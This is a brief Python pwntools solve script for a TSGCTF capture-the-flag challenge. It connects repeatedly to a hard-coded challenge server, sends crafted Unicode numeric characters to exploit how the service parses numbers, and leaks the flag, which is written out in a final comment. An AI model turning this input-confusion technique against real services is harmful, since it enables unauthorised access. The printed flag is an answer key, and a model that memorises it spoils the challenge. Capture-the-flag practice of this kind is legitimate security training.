from pwn import *

# nc 34.146.186.1 53117
S = "①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳㉑㉒㉓㉔㉕㉖㉗㉘㉙㉚㉛㉜㉝㉞㉟㊱㊲㊳㊴㊵㊶㊷㊸㊹㊺㊻㊼㊽㊾㊿"

flag = ""
for s in S:
    # io = remote("34.146.186.1", 53117)
    io = remote("34.146.186.1", 53117)
    # io.sendline(f"༬𞴣༰𒐳{s}".encode())
    io.sendline(f"𞴚㉔𝋱𒐳{s}".encode())
    flag += io.recvline().decode().strip().split("is ")[1]
    print(flag, end="")
    io.close()
print(flag)

# TSGCTF{Num63r5_b0w_+o_y0ur_bri11i4nC3!}
